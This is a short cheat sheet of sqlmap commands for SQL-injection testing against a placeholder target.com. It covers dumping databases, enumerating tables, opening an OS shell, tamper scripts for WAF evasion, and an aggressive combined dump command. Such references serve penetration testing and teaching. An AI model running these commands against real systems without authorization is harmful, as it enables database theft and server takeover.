---
title: Sqlmap Command List
date: 2026-01-05
category: commands
enrich: false
tags: sqlmap, cybersecurity, command reference
description: Top 10 essential commands for sqlmap.
---

# Sqlmap Command Guide

**Sqlmap** is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

## Top 10 Useful Commands

### 1. Basic Scan
```bash
sqlmap -u "http://target.com/vuln.php?id=1"
```
**Explanation:** The standard scan against a URL with parameters.

### 2. Auto-Accept Defaults
```bash
sqlmap -u "http://target.com?id=1" --batch
```
**Explanation:** Never ask for user input (`--batch`), use default behavior. unique for automation.

### 3. POST Request (Saved File)
```bash
sqlmap -r request.txt --batch
```
**Explanation:** Load a raw HTTP request from a file (`-r`). Best way to scan POST forms.

### 4. Dump Database
```bash
sqlmap -u "http://target.com?id=1" --dump
```
**Explanation:** Dump the database data entries.

### 5. List Booty
```bash
sqlmap -u "http://target.com?id=1" --dbs --tables --columns
```
**Explanation:** Enumerate Databases (`--dbs`), Tables (`--tables`), or Columns (`--columns`).

### 6. OS Shell
```bash
sqlmap -u "http://target.com?id=1" --os-shell
```
**Explanation:** Prompt for an interactive operating system shell (requires DBA privileges usually).

### 7. Random Agent
```bash
sqlmap -u "http://target.com?id=1" --random-agent
```
**Explanation:** Use a random User-Agent header.

### 8. Crawl
```bash
sqlmap -u "http://target.com" --crawl=1
```
**Explanation:** Crawl the site to find injection points automatically.

### 9. Tamper Scripts
```bash
sqlmap -u "http://target.com?id=1" --tamper="space2comment"
```
**Explanation:** Use scripts to obfuscate the payload to bypass WAFs.

### 10. Level & Risk
```bash
sqlmap -u "http://target.com?id=1" --level=5 --risk=3
```
**Explanation:** `Level 5` tests all headers (Cookie, Referer). `Risk 3` uses heavy payloads (OR-based) that might be noisy.

## The Most Powerful Command
```bash
sqlmap -r request.txt --batch --level=5 --risk=3 --tamper=between,space2comment --threads=10 --dump
```
**Explanation:** High-intensity scan using a captured request, aggressive testing levels, WAF evasion scripts, and multi-threading to dump data.

